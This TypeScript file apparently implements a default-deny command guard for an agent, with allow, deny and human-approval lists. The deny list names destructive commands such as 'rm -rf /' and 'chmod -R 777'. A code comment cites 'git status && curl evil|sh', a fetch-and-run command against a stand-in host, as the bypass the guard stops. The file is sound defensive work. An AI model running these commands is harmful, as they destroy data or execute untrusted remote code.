import type { CommandDecision, CommandGuard, CommandPolicy } from "./types";

export const DEFAULT_COMMAND_POLICY: CommandPolicy = {
  defaultAction: "deny",
  allow: ["git status", "git diff", "git log", "git branch", "ls", "cat", "pnpm typecheck", "pnpm test"],
  deny: ["rm -rf /", "sudo", "chmod -R 777"],
  requireApproval: ["git push", "git reset --hard", "rm -rf", "drop table", "delete from", "DROP TABLE", "DELETE FROM"],
};

export function createCommandGuard(initial: CommandPolicy = DEFAULT_COMMAND_POLICY): CommandGuard {
  let policy = initial;

  // 分词匹配：规则 token 序列须与命令前缀逐词相等。含 shell 元字符（&& ; | > <）
  // 的复合命令不与任何规则匹配："git status && curl evil|sh" 不再借 "git status"
  // 前缀命中 allow，落入 deny 兜底；而普通前缀延展 "git status -sb" 仍放行。
  const tokens = (value: string): string[] => value.trim().toLowerCase().split(/\s+/).filter(Boolean);
  const SHELL_META = /[;&|<>]/;
  const isCompound = (command: string): boolean => {
    const commandTokens = tokens(command);
    return commandTokens.some((token) => SHELL_META.test(token));
  };
  const matches = (list: string[] | undefined, command: string): boolean => {
    if (!list || list.length === 0 || isCompound(command)) return false;
    const commandTokens = tokens(command);
    return list.some((rule) => {
      const ruleTokens = tokens(rule);
      if (ruleTokens.length === 0 || ruleTokens.length > commandTokens.length) return false;
      return ruleTokens.every((token, index) => token === commandTokens[index]);
    });
  };

  return {
    allowCommand(command): CommandDecision {
      if (matches(policy.deny, command)) {
        return { allowed: false, reason: "命令命中拒绝规则" };
      }
      if (matches(policy.requireApproval, command)) {
        return { allowed: true, requiresApproval: true, reason: "需要人工审批" };
      }
      if (policy.defaultAction === "allow" || matches(policy.allow, command)) {
        return { allowed: true };
      }
      return { allowed: false, reason: "未在允许列表中" };
    },
    setPolicy(next) {
      policy = next;
    },
    getPolicy() {
      return policy;
    },
  };
}
